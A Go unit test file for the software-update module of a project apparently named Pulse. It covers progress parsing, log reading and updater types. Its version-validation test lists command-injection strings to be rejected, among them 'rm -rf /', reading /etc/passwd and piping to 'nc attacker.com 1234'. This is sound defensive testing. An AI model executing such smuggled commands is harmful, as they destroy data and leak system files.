package updates

import (
	"context"
	"os"
	"path/filepath"
	"regexp"
	"testing"
)

func TestInstallShAdapter_ParseProgress(t *testing.T) {
	adapter := &InstallShAdapter{}

	tests := []struct {
		name           string
		line           string
		wantStage      string
		wantProgress   int
		wantMessage    string
		wantIsComplete bool
	}{
		// Downloading stage
		{
			name:         "downloading lowercase",
			line:         "downloading pulse binary...",
			wantStage:    "downloading",
			wantProgress: 30,
			wantMessage:  "Downloading update...",
		},
		{
			name:         "downloading uppercase",
			line:         "DOWNLOADING files from GitHub",
			wantStage:    "downloading",
			wantProgress: 30,
			wantMessage:  "Downloading update...",
		},
		{
			name:         "downloading mixed case",
			line:         "Downloading release v1.2.3",
			wantStage:    "downloading",
			wantProgress: 30,
			wantMessage:  "Downloading update...",
		},

		// Extracting stage
		{
			name:         "extracting lowercase",
			line:         "extracting tarball...",
			wantStage:    "extracting",
			wantProgress: 40,
			wantMessage:  "Extracting files...",
		},
		{
			name:         "extracting in sentence",
			line:         "Now extracting the archive to /opt/pulse",
			wantStage:    "extracting",
			wantProgress: 40,
			wantMessage:  "Extracting files...",
		},

		// Installing stage
		{
			name:         "installing lowercase",
			line:         "installing pulse binary...",
			wantStage:    "installing",
			wantProgress: 60,
			wantMessage:  "Installing...",
		},
		{
			name:         "installing uppercase",
			line:         "INSTALLING to /opt/pulse/bin",
			wantStage:    "installing",
			wantProgress: 60,
			wantMessage:  "Installing...",
		},

		// Backup stage
		{
			name:         "backup lowercase",
			line:         "backup created at /etc/pulse.bak",
			wantStage:    "backing-up",
			wantProgress: 25,
			wantMessage:  "Creating backup...",
		},
		{
			name:         "backup with path",
			line:         "Creating backup: /var/backup/pulse-20231201",
			wantStage:    "backing-up",
			wantProgress: 25,
			wantMessage:  "Creating backup...",
		},

		// Configuring stage
		{
			name:         "configuring lowercase",
			line:         "configuring systemd service...",
			wantStage:    "configuring",
			wantProgress: 70,
			wantMessage:  "Configuring...",
		},
		{
			name:         "configuration partial match",
			line:         "configuration files updated",
			wantStage:    "configuring",
			wantProgress: 70,
			wantMessage:  "Configuring...",
		},

		// Restarting stage
		{
			name:         "restart lowercase",
			line:         "restart pulse service...",
			wantStage:    "restarting",
			wantProgress: 90,
			wantMessage:  "Restarting service...",
		},
		{
			name:         "restarting",
			line:         "restarting the pulse service",
			wantStage:    "restarting",
			wantProgress: 90,
			wantMessage:  "Restarting service...",
		},

		// Completed stage
		{
			name:           "completed lowercase",
			line:           "update completed",
			wantStage:      "completed",
			wantProgress:   100,
			wantMessage:    "Update completed",
			wantIsComplete: true,
		},
		{
			name:           "complete partial",
			line:           "Installation complete!",
			wantStage:      "completed",
			wantProgress:   100,
			wantMessage:    "Update completed",
			wantIsComplete: true,
		},
		{
			name:           "success",
			line:           "success: pulse has been updated",
			wantStage:      "completed",
			wantProgress:   100,
			wantMessage:    "Update completed",
			wantIsComplete: true,
		},
		{
			name:           "successfully",
			line:           "Pulse updated successfully!",
			wantStage:      "completed",
			wantProgress:   100,
			wantMessage:    "Update completed",
			wantIsComplete: true,
		},

		// No match cases
		{
			name:         "empty string",
			line:         "",
			wantStage:    "",
			wantProgress: 0,
			wantMessage:  "",
		},
		{
			name:         "unrelated output",
			line:         "checking permissions...",
			wantStage:    "",
			wantProgress: 0,
			wantMessage:  "",
		},
		{
			name:         "version info",
			line:         "Current version: v1.2.3",
			wantStage:    "",
			wantProgress: 0,
			wantMessage:  "",
		},
		{
			name:         "random log line",
			line:         "2024-01-01 12:00:00 INFO Starting update process",
			wantStage:    "",
			wantProgress: 0,
			wantMessage:  "",
		},

		// Note: map iteration order is not guaranteed, so when multiple
		// patterns match, any of them could be returned. This tests the
		// behavior for lines that only match one pattern.
		{
			name:         "only downloading matches",
			line:         "downloading files from server",
			wantStage:    "downloading",
			wantProgress: 30,
			wantMessage:  "Downloading update...",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := adapter.parseProgress(tc.line)

			if result.Stage != tc.wantStage {
				t.Errorf("Stage = %q, want %q", result.Stage, tc.wantStage)
			}
			if result.Progress != tc.wantProgress {
				t.Errorf("Progress = %d, want %d", result.Progress, tc.wantProgress)
			}
			if result.Message != tc.wantMessage {
				t.Errorf("Message = %q, want %q", result.Message, tc.wantMessage)
			}
			if result.IsComplete != tc.wantIsComplete {
				t.Errorf("IsComplete = %v, want %v", result.IsComplete, tc.wantIsComplete)
			}
		})
	}
}

func TestInstallShAdapter_ReadLastLines(t *testing.T) {
	adapter := &InstallShAdapter{}

	tests := []struct {
		name     string
		content  string
		n        int
		expected string
	}{
		{
			name:     "read last 3 lines from 5 line file",
			content:  "line1\nline2\nline3\nline4\nline5",
			n:        3,
			expected: "line3\nline4\nline5",
		},
		{
			name:     "read last 5 lines from 3 line file",
			content:  "line1\nline2\nline3",
			n:        5,
			expected: "line1\nline2\nline3",
		},
		{
			name:     "read last 1 line",
			content:  "line1\nline2\nline3",
			n:        1,
			expected: "line3",
		},
		{
			name:     "read last 0 lines returns empty",
			content:  "line1\nline2\nline3",
			n:        0,
			expected: "",
		},
		{
			name:     "empty file",
			content:  "",
			n:        5,
			expected: "",
		},
		{
			name:     "single line file",
			content:  "only line",
			n:        3,
			expected: "only line",
		},
		{
			name:     "file with trailing newline",
			content:  "line1\nline2\nline3\n",
			n:        2,
			expected: "line2\nline3",
		},
		{
			name:     "large n value",
			content:  "a\nb\nc",
			n:        1000,
			expected: "a\nb\nc",
		},
		{
			name:     "negative n returns empty",
			content:  "line1\nline2",
			n:        -1,
			expected: "",
		},
		{
			name:     "lines with special characters",
			content:  "error: failed!\nwarning: [WARN]\ninfo: done",
			n:        2,
			expected: "warning: [WARN]\ninfo: done",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			// Create temp file with content
			tmpDir := t.TempDir()
			tmpFile := filepath.Join(tmpDir, "test.log")

			if tc.content != "" {
				if err := os.WriteFile(tmpFile, []byte(tc.content), 0644); err != nil {
					t.Fatalf("Failed to create test file: %v", err)
				}
			} else {
				// Create empty file
				f, err := os.Create(tmpFile)
				if err != nil {
					t.Fatalf("Failed to create test file: %v", err)
				}
				f.Close()
			}

			result := adapter.readLastLines(tmpFile, tc.n)

			if result != tc.expected {
				t.Errorf("readLastLines() = %q, want %q", result, tc.expected)
			}
		})
	}
}

func TestInstallShAdapter_ReadLastLines_FileNotFound(t *testing.T) {
	adapter := &InstallShAdapter{}

	result := adapter.readLastLines("/nonexistent/path/file.log", 5)

	if result != "" {
		t.Errorf("readLastLines() for nonexistent file = %q, want empty string", result)
	}
}

func TestVersionPatternValidation(t *testing.T) {
	// This tests the version pattern used in Execute() for command injection prevention
	versionPattern := regexp.MustCompile(`^v?\d+\.\d+\.\d+(?:-[a-zA-Z0-9.-]+)?(?:\+[a-zA-Z0-9.-]+)?$`)

	tests := []struct {
		version string
		valid   bool
	}{
		// Valid versions
		{"1.0.0", true},
		{"v1.0.0", true},
		{"0.0.1", true},
		{"v0.0.1", true},
		{"10.20.30", true},
		{"v10.20.30", true},
		{"1.2.3-alpha", true},
		{"v1.2.3-alpha", true},
		{"1.2.3-beta.1", true},
		{"v1.2.3-beta.1", true},
		{"1.2.3-rc1", true},
		{"v1.2.3-rc1", true},
		{"1.2.3-alpha.beta.gamma", true},
		{"1.2.3+build", true},
		{"v1.2.3+build", true},
		{"1.2.3+build.123", true},
		{"1.2.3-alpha+build", true},
		{"v1.2.3-alpha+build.456", true},

		// Invalid versions - potential injection attempts
		{"1.0.0; rm -rf /", false},
		{"1.0.0 && cat /etc/passwd", false},
		{"1.0.0 | nc attacker.com 1234", false},
		{"$(whoami)", false},
		{"`id`", false},
		{"1.0.0\nmalicious", false},
		{"1.0.0$(touch /tmp/pwned)", false},
		{"../../../etc/passwd", false},
		{"", false},
		{"v", false},
		{"1", false},
		{"1.0", false},
		{"1.0.0.0", false},
		{"v1.0.0.0", false},
		{"latest", false},
		{"master", false},
		{"main", false},
		{"HEAD", false},
		{"1.0.0-", false},        // trailing dash
		{"1.0.0+", false},        // trailing plus
		{"-1.0.0", false},        // leading dash
		{"v-1.0.0", false},       // invalid prefix
		{"V1.0.0", false},        // uppercase V not allowed
		{"1.0.0--alpha", true},   // double dash allowed (not a security risk)
		{"1.0.0++build", false},  // double plus
		{"1.0.0-alpha_1", false}, // underscore not allowed in prerelease
		{"1.0.0+build_1", false}, // underscore not allowed in build metadata
	}

	for _, tc := range tests {
		t.Run(tc.version, func(t *testing.T) {
			result := versionPattern.MatchString(tc.version)
			if result != tc.valid {
				t.Errorf("version %q: got valid=%v, want valid=%v", tc.version, result, tc.valid)
			}
		})
	}
}

func TestDockerUpdater(t *testing.T) {
	updater := NewDockerUpdater()

	t.Run("SupportsApply", func(t *testing.T) {
		if updater.SupportsApply() {
			t.Error("DockerUpdater should not support auto apply")
		}
	})

	t.Run("GetDeploymentType", func(t *testing.T) {
		if updater.GetDeploymentType() != "docker" {
			t.Errorf("GetDeploymentType() = %q, want %q", updater.GetDeploymentType(), "docker")
		}
	})

	t.Run("Execute returns error", func(t *testing.T) {
		err := updater.Execute(context.Background(), UpdateRequest{}, nil)
		if err == nil {
			t.Error("Execute() should return error for docker deployments")
		}
	})

	t.Run("Rollback returns error", func(t *testing.T) {
		err := updater.Rollback(context.Background(), "event-123")
		if err == nil {
			t.Error("Rollback() should return error for docker deployments")
		}
	})
}

func TestAURUpdater(t *testing.T) {
	updater := NewAURUpdater()

	t.Run("SupportsApply", func(t *testing.T) {
		if updater.SupportsApply() {
			t.Error("AURUpdater should not support auto apply")
		}
	})

	t.Run("GetDeploymentType", func(t *testing.T) {
		if updater.GetDeploymentType() != "aur" {
			t.Errorf("GetDeploymentType() = %q, want %q", updater.GetDeploymentType(), "aur")
		}
	})

	t.Run("Execute returns error", func(t *testing.T) {
		err := updater.Execute(context.Background(), UpdateRequest{}, nil)
		if err == nil {
			t.Error("Execute() should return error for AUR deployments")
		}
	})

	t.Run("Rollback returns error", func(t *testing.T) {
		err := updater.Rollback(context.Background(), "event-123")
		if err == nil {
			t.Error("Rollback() should return error for AUR deployments")
		}
	})
}

func TestInstallShAdapter_SupportsApply(t *testing.T) {
	adapter := &InstallShAdapter{}

	if !adapter.SupportsApply() {
		t.Error("InstallShAdapter should support auto apply")
	}
}

func TestInstallShAdapter_GetDeploymentType(t *testing.T) {
	adapter := &InstallShAdapter{}

	if adapter.GetDeploymentType() != "systemd" {
		t.Errorf("GetDeploymentType() = %q, want %q", adapter.GetDeploymentType(), "systemd")
	}
}

func TestNewInstallShAdapter(t *testing.T) {
	adapter := NewInstallShAdapter(nil)

	if adapter == nil {
		t.Fatal("NewInstallShAdapter returned nil")
	}

	if adapter.installScriptURL == "" {
		t.Error("installScriptURL should not be empty")
	}

	if adapter.logDir == "" {
		t.Error("logDir should not be empty")
	}

	expectedURL := "https://github.com/rcourtman/Pulse/releases/latest/download/install.sh"
	if adapter.installScriptURL != expectedURL {
		t.Errorf("installScriptURL = %q, want %q", adapter.installScriptURL, expectedURL)
	}

	expectedLogDir := "/var/log/pulse"
	if adapter.logDir != expectedLogDir {
		t.Errorf("logDir = %q, want %q", adapter.logDir, expectedLogDir)
	}
}
